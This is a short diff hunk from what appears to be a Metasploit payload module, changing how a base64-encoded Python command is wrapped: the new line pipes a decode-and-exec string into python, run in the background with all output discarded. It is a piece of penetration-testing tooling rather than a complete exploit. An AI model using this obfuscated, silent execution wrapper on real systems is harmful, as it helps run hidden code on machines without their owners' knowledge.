@@ -65,7 +65,7 @@ module MetasploitModule
 
     # The *nix shell wrapper to keep things clean
     # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
-    cmd = "python -c \"exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))\""
+    cmd = "echo \"exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))\" | python"
     cmd += ' >/dev/null 2>&1 &'
     return cmd
 
